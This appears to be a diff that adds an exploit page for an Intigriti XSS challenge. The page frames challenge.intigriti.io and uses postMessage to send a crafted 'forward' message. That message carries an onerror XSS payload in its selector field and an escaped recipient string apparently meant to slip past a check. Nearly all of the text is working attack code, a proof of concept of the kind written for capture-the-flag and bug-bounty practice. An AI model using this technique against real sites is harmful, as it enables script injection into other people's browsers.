@@ -1,1 +1,13 @@
-<h1>a</h1>
+<script>
+  window.onload = function()
+  {
+    var frame = document.getElementById("frame");
+    frame.contentWindow.postMessage({
+      type: "forward",
+      event: "ajaxSuccess",
+      selector: "<img src=x onerror=alert(document.domain)>",
+      recipient: "\x70\x10\x10\x10\x10\u6161\u6100\u7373"
+    }, "*");
+  };
+</script>
+<iframe id="frame" src="https://challenge.intigriti.io"></iframe>
